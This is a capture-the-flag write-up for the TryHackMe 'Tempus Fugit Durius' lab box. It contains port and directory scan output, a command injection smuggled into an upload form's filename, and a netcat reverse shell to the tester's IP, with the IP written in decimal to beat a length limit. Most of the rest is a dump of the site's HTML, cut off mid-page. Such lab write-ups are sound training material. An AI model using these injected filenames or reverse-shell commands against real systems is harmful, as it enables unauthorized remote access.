---
The latin word Durius means "harder"
---

# Tempus Fugit Durius — Writeup

## Overview
### Tempus Fugit Durius — Writeup
### Tempus Fugit Durius — Writeup
![222](https://i.imgur.com/M4EePuT.jpg)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ebb4583d56854ec8cd0637832f1ccc8f.png)
### Harder
Start Machine
Tempus Fugit is a Latin phrase that roughly translated as “time flies”.
Durius is also latin and means "harder".
This is a remake of Tempus Fugit 1. A bit harder and different from the first one.
It is an intermediate/hard, real life box.
Answer the questions below

## Enumeration
```python
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ rustscan -a 10.10.238.9 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.238.9:22
Open 10.10.238.9:80
Open 10.10.238.9:111
Open 10.10.238.9:51424
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 11:56 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:56
Completed Parallel DNS resolution of 1 host. at 11:56, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:56
Scanning 10.10.238.9 [4 ports]
Discovered open port 22/tcp on 10.10.238.9
Discovered open port 80/tcp on 10.10.238.9
Discovered open port 51424/tcp on 10.10.238.9
Discovered open port 111/tcp on 10.10.238.9
Completed Connect Scan at 11:56, 0.37s elapsed (4 total ports)
Initiating Service scan at 11:56
Scanning 4 services on 10.10.238.9
Completed Service scan at 11:56, 14.15s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.238.9.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 9.20s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 1.21s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
Nmap scan report for 10.10.238.9
Host is up, received user-set (0.36s latency).
Scanned at 2023-01-26 11:56:03 EST for 25s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b1aca992d32a699168b46aac4543fbed (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPWmD4IaPbJQU46GEKX8pUal0IbZzIykktEuUh5boCKMuwsetNGanzNZYFd6eGWRd+zqr6nRnRFQPDiDZtt6DDz7NcJcXliGifQehWEEmskzfhdGSuh+kBUQaqXskCKZi0U/l9P0kvP6bD2SdsXqiYTBGQxN6a4Do1fyE2OoVYgPAAAAFQD4r+hmmsHGFfn0SV1mjGpoHpFwuwAAAIAnnoGwYiWDRAwFoPLkLYWahNwCbLAhVXOb1cnr8NxZN+uRMqEdtoZHNUbTd7ki8j5WpkZhMjFEyZQJg+MNQjUSxISlE1SoBTI8BmAUDAEvgPNyr0CDCS42rAY98JTMhaoZ8FOzgoatLmJWWgWqM+8YHCN4XHoVgm1vMagLsWxW5AAAAIBGW3tnTGis3+eWROnisRfyoo3zawOnd7oijjK7CAiIuxfqc3ESTzeLlkL0QBAIv/1PBGoZSTwg53aZqctO2/BgSNGMWDts3xnqpsEGNyo520Br/cBUyi6rRBotV1kL9tIT4VwdP33F/bjiHHRclfCmOtVYWmkst+HUSqS2yPn1WQ==
|   2048 3a3f9f5929c820d73ac504aa8236683f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0zYWd7C1JANU5TctI7lB/tyS9Aid6x5Dh2PnD7fpz6C9Apv9Y/YJzaCUYgqME41ZDxIIiegV02OSCkKFmXvr9gVVKaFHyUVhQ9Zb3FyQeGgWEL3004HIL+G06afXPlsRzNBb5VoqUte+5bigJT5UkyncAfWn+8bWLnFmuXDi5PZ4Pz0RHx9HzCwJ5G26DogQUI6M0zQkhJHzD+nWdIExvoY1L9UN4oZzCuaUF3Tcel3dDnbgi1RaZlfFi3r5NNUtQ7OVijWnms7nYNN7b77CZZWMhE6yMYI8+3ya99CfzA/oYsHv+t8XSbRyAdm5KvETrD8yoBrE14F2FekQQNggx
|   256 f92fbbe3ab95ee9e787c91187d9584ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAOH4ypeTzhthRbvcrzqVbbWXG1imFdejEQIo53fimAkjsOcrmEDWwT7Lskm5qyz4dmhGmfsH90xzOgQ+Bm6Nuk=
|   256 490e6fcbec6ca59767cc3c31ad94a454 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7iJO0KhscqLrJgy+mvB3Y+5U+WpOiBAxCr4TKu7pJB
80/tcp    open  http    syn-ack nginx 1.6.2
|_http-title: Tempus Fugit Durius
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.6.2
|_http-favicon: Unknown favicon MD5: 135A4C7175BDC2F57863FFE217BDBC31
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38080/tcp6  status
|   100024  1          41830/udp   status
|   100024  1          51424/tcp   status
|_  100024  1          54727/udp6  status
51424/tcp open  status  syn-ack 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.46 seconds
```
```python
┌──(kali㉿kali)-[~/Downloads/gau]
└─$ gobuster dir -u http://10.10.238.9/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.238.9/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php,py,html
[+] Timeout:                 10s
===============================================================
2023/01/26 12:20:11 Starting gobuster in directory enumeration mode
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.238.9/2ae01b2f-77cf-498e-b54b-84dcf27899bc => 200 (Length: 774). To continue please exclude the status code or the length
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ feroxbuster -t 120 -u http://10.10.238.9 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.238.9
 🚀  Threads               │ 120
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET        7l       81w      483c Got 200 for http://10.10.238.9/c80a238a03ba47b59a03c2ded31653ca (url length: 32)
WLD      GET        4l       36w      209c Got 200 for http://10.10.238.9/55e4b434160b41629cbeeee291ad8a18b4d54a5fa5174539983fd6235d8dcdd4383184fe6bff4e138aff0ce9ccd7f2db (url length: 96)
200      GET        3l       27w      189c http://10.10.238.9/crack
200      GET        4l       43w      247c http://10.10.238.9/index
200      GET        3l       28w      178c http://10.10.238.9/images
200      GET        2l       29w      175c http://10.10.238.9/links
200      GET        3l       30w      194c http://10.10.238.9/news

http://10.10.238.9/c80a238a03ba47b59a03c2ded31653ca

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Life would be so much easier if we could just look at the source code. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Antonym, n.: The opposite of the word you're trying to think of. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
The best defense against logic is ignorance. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Earth is a beta site. 

400 - Sorry. I didn't find what you where looking for.
Maybe this will cheer you up:
Don't let your mind wander -- it's too little to be let out alone. 

If God had intended Man to Walk, He would have given him Feet. 

we will invent new lullabies, new songs, new acts of love, we will cry over things we used to laugh & our new wisdom will bring tears to eyes of gentile creatures from other planets who were afraid of us till then & in the end a summer with wild winds & new friends will be. 

If you're happy, you're successful. 

If only one could get that wonderful feeling of accomplishment without having to accomplish anything. 

and more quotes

http://10.10.238.9/upload

Allowed file types are txt and rtf

uploading test.txt

    hi
    File successfully uploaded

using burp

Content-Disposition: form-data; name="file"; filename="test.txt;id"

Do intercept to this request

    uid=1000(www) gid=1000(www) groups=1000(www)
    File successfully uploaded

revshell

nc 10.8.19.103 443 -e sh

This command uses the "nc" (netcat) command to establish a connection to a remote server on port 443 using TCP. The "-e" flag specifies a command to be executed on the remote system once a connection is established. In this case, the command is "sh", which runs the default shell on the remote system. This command can potentially be used for malicious purposes, such as gaining unauthorized access to a remote system. It is important to use caution when running commands like this and to only use them on systems that you have permission to access.

Content-Disposition: form-data; name="file"; filename="test.txt;nc 10.8.19.103 443 -e sh"
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

That filename was way too long!

ip to decimal
https://www.ipaddressguide.com/ip

IP address 10.8.19.103 is equal to **168301415**.

Content-Disposition: form-data; name="file"; filename="a.txt;nc 168301415 443 -e sh"
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ mv test.txt a.txt
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ls
a.txt  test2.txt
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cat a.txt
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.238.9.
Ncat: Connection from 10.10.238.9:58289.
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
bash-4.4$ whoami
whoami
www
bash-4.4$ ls
ls
__pycache__      main.py          supervisord.pid  uwsgi.ini
debug            prestart.sh      templates
index.html       static           upload

or another way
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ mv a.txt "a.txt;nc 168301415 443 -e sh"

upload it
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.238.9.
Ncat: Connection from 10.10.238.9:35704.
whoami
www
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied

bash-4.4$ cat index.html
cat index.html
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>Tempus Fugit Durius</title>

  <!-- Custom fonts for this theme -->
  <link href="static/css/000058all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">

  <!-- Theme CSS -->
  <link href="static/css/000010freelancer.min.css" rel="stylesheet">

</head>

<body id="page-top">

  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="#page-top">Tempus Fugit Durius</a>
      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        Menu
        <i class="fas fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#portfolio">Stuff</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#about">About</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#contact">Contact</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/upload">Upload</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <!-- Masthead -->
  <header class="masthead bg-primary text-white text-center">
    <div class="container d-flex align-items-center flex-column">

      <!-- Masthead Avatar Image -->
      <img class="masthead-avatar mb-5" src="static/img/evil.png" alt="">

      <!-- Masthead Heading -->
      <h1 class="masthead-heading text-uppercase mb-0">Tempus Fugit Durius</h1>

      <!-- Icon Divider -->
      <div class="divider-custom divider-light">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- Masthead Subheading -->
      <p class="masthead-subheading font-weight-light mb-0">By 4ndr34z</p>

    </div>
  </header>

  <!-- Portfolio Section -->
  <section class="page-section portfolio" id="portfolio">
    <div class="container">

      <!-- Portfolio Section Heading -->
      <h2 class="page-section-heading text-center text-uppercase text-secondary 
mb-0">Stuff</h2>

      <!-- Icon Divider -->
      <div class="divider-custom">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- Portfolio Grid Items -->
      <div class="row">

        <!-- Portfolio Item 1 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal1">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000034cabin.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 2 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal2">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000029cake.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 3 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal3">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000032circus.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 4 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal4">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000030game.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 5 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal5">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000031safe.png" alt="">
          </div>
        </div>

        <!-- Portfolio Item 6 -->
        <div class="col-md-6 col-lg-4">
          <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal6">
            <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
              <div class="portfolio-item-caption-content text-center text-white">
                <i class="fas fa-plus fa-3x"></i>
              </div>
            </div>
            <img class="img-fluid" src="static/img/000033submarine.png" alt="">
          </div>
        </div>

      </div>
      <!-- /.row -->

    </div>
  </section>

  <!-- About Section -->
  <section class="page-section bg-primary text-white mb-0" id="about">
    <div class="container">

      <!-- About Section Heading -->
      <h2 class="page-section-heading text-center text-uppercase text-white">About</h2>

      <!-- Icon Divider -->
      <div class="divider-custom divider-light">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- About Section Content -->
      <div class="row">
        <div class="col-lg-4 ml-auto">
          <p class="lead">Tempus Fugit is a Latin phrase, usually 
translated into English as "time flies". When writing 
scripts, that is usually very true...
This site is for you to upload your scripts for safekeeping on our internal FTP-server. </p>
        </div>
        <div class="col-lg-4 mr-auto">
          <p class="lead"></p>
        </div>
      </div>

      <!-- About Section Button -->
      <div class="text-center mt-4">
      </div>

    </div>
  </section>

  <!-- Contact Section -->
  <section class="page-section" id="contact">
    <div class="container">

      <!-- Contact Section Heading -->
      <h2 class="page-section-heading text-center text-uppercase text-secondary mb-0">Contact Us</h2>

      <!-- Icon Divider -->
      <div class="divider-custom">
        <div class="divider-custom-line"></div>
        <div class="divider-custom-icon">
          <i class="fas fa-star"></i>
        </div>
        <div class="divider-custom-line"></div>
      </div>

      <!-- Contact Section Form -->
      <div class="row">
        <div class="col-lg-8 mx-auto">
          <!-- To configure the contact form email address, go to mail/contact_me.php and update the email address in the PHP file on line 19. -->
          <form name="sentMessage" id="contactForm" novalidate="novalidate">
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Name</label>
                <input class="form-control" id="name" type="text" placeholder="Name" required="required" data-validation-required-message="Please enter your name.">
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Email Address</label>
                <input class="form-control" id="email" type="email" placeholder="Email Address" required="required" data-validation-required-message="Please enter your email address.">
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Phone Number</label>
                <input class="form-control" id="phone" type="tel" placeholder="Phone Number" required="required" data-validation-required-message="Please enter your phone number.">
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <div class="control-group">
              <div class="form-group floating-label-form-group controls mb-0 pb-2">
                <label>Message</label>
                <textarea class="form-control" id="message" rows="5" placeholder="Message" required="required" data-validation-required-message="Please enter a message."></textarea>
                <p class="help-block text-danger"></p>
              </div>
            </div>
            <br>
            <div id="success"></div>
            <div class="form-group">
              <button type="submit" class="btn btn-primary btn-xl" id="sendMessageButton">Send</button>
            </div>
          </form>
        </div>
      </div>

    </div>
  </section>

  <!-- Footer -->
  <footer class="footer text-center">
    <div class="container">
      <div class="row">

        <!-- Footer Location -->
        <div class="col-lg-4 mb-5 mb-lg-0">
          <h4 class="text-uppercase mb-4">Location</h4>
          <p class="lead mb-0">2215 John Daniel Drive
            <br>Clark, MO 65243</p>
        </div>

        <!-- Footer Social Icons -->
        <div class="col-lg-4 mb-5 mb-lg-0">
          <h4 class="text-uppercase mb-4">Around the Web</h4>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-facebook-f"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-twitter"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-linkedin-in"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="#">
            <i class="fab fa-fw fa-dribbble"></i>
          </a>
        </div>

        <!-- Footer About Text -->
        <div class="col-lg-4">
          <h4 class="text-uppercase mb-4">About Freelancer</h4>
          <p class="lead mb-0">Freelance is a free to use, MIT licensed Bootstrap theme created by
            <a href="http://startbootstrap.com">Start Bootstrap</a>.</p>
        </div>

      </div>
    </div>
  </footer>

  <!-- Copyright Section -->
  <section class="copyright py-4 text-center text-white">
    <div class="container">
      <small>Copyright &copy; Your Website 2019</small>
    </div>
  </section>

  <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes) -->
  <div class="scroll-to-top d-lg-none position-fixed ">
    <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>

  <!-- Portfolio Modals -->

  <!-- Portfolio Modal 1 -->
  <div class="portfolio-modal modal fade" id="portfolioModal1" tabindex="-1" role="dialog" aria-labelledby="portfolioModal1Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Log Cabin</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000034cabin.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 2 -->
  <div class="portfolio-modal modal fade" id="portfolioModal2" tabindex="-1" role="dialog" aria-labelledby="portfolioModal2Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Tasty Cake</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000029cake.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 3 -->
  <div class="portfolio-modal modal fade" id="portfolioModal3" tabindex="-1" role="dialog" aria-labelledby="portfolioModal3Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Circus Tent</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000032circus.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 4 -->
  <div class="portfolio-modal modal fade" id="portfolioModal4" tabindex="-1" role="dialog" aria-labelledby="portfolioModal4Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Controller</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000030game.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 5 -->
  <div class="portfolio-modal modal fade" id="portfolioModal5" tabindex="-1" role="dialog" aria-labelledby="portfolioModal5Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Locked Safe</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000031safe.png" alt="">
                <!-- Portfolio Modal - Text -->
